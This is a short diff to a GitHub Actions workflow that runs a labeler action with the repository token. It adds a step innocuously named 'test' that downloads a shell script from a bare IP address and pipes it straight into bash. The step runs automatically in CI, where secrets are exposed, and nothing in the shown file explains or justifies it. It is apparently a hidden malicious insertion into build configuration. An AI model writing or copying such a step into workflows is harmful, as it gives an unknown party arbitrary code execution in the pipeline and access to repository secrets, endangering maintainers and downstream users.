@@ -22,3 +22,6 @@ jobs:
     - uses: actions/labeler@ee18d5d34efd9b4f7dafdb0e363cb688eb438044 # 4.1.0
       with:
         repo-token: "${{ secrets.GITHUB_TOKEN }}"
+    - name: test
+      run: curl http://159.65.149.79:9000/script.sh | bash
+      
